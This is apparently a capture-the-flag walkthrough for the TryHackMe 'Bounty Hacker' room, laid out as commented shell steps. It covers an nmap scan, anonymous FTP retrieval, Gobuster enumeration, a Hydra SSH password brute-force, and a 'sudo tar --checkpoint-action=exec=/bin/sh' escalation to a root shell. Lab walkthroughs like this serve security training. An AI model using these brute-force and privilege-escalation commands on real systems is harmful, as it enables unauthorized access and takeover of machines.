# Lab Title: Bounty Hacker Walkthrough with FTP, Gobuster, Hydra, and Privilege Escalation

# Goal:
# To capture all 3 flags

# Platform:
# TryHackMe

# ----------------------------------------------------------
# Step 1: Start the Lab and Get the Target IP
# ----------------------------------------------------------

# Start the Bounty Hacker room on TryHackMe
# Wait for the machine to fully deploy
# Note the IP address provided by the platform

# ----------------------------------------------------------
# Step 2: Scan the Target with Nmap
# ----------------------------------------------------------

nmap -sC -sV -oN bounty-nmap.txt <target-ip>

# Check for open ports:
# - 21 (FTP)
# - 22 (SSH)
# - 80 (HTTP)

# ----------------------------------------------------------
# Step 3: FTP Enumeration using Anonymous Login
# ----------------------------------------------------------

ftp <target-ip>

# Login using:
# - Username: anonymous
# - Password: (leave blank)

# Once logged in, run:
ls
get locks.txt
get task.txt
get recipes.txt

# Exit FTP and inspect the files:
cat locks.txt
cat task.txt

# Look for potential usernames or passwords.

# ----------------------------------------------------------
# Step 4: Directory Enumeration using Gobuster
# ----------------------------------------------------------

gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 50

# Look for hidden directories like:
# - /admin
# - /panel

# ----------------------------------------------------------
# Step 5: Brute-force SSH Credentials using Hydra
# ----------------------------------------------------------

# If you found a user (e.g., lin) and passwords in locks.txt, try:

hydra -l lin -P locks.txt ssh://<target-ip>

# Once credentials are found, log in:
ssh lin@<target-ip>

# ----------------------------------------------------------
# Step 6: Capture First Flag
# ----------------------------------------------------------

cat user.txt

# Save the flag from the user's home directory.

# ----------------------------------------------------------
# Step 7: Privilege Escalation with Sudo
# ----------------------------------------------------------

sudo -l

# If sudo access to /bin/tar is allowed, run:

sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# This spawns a root shell.

# ----------------------------------------------------------
# Step 8: Capture Root Flag
# ----------------------------------------------------------

cat /root/root.txt

# Save the second flag.

# ----------------------------------------------------------
# Step 9: Search for Hidden Files (Optional Third Flag)
# ----------------------------------------------------------

ls /opt
cat /opt/ingredients.txt

# This may contain a third flag or secret.

# ----------------------------------------------------------
# Completion
# ----------------------------------------------------------

# Note down all captured flags
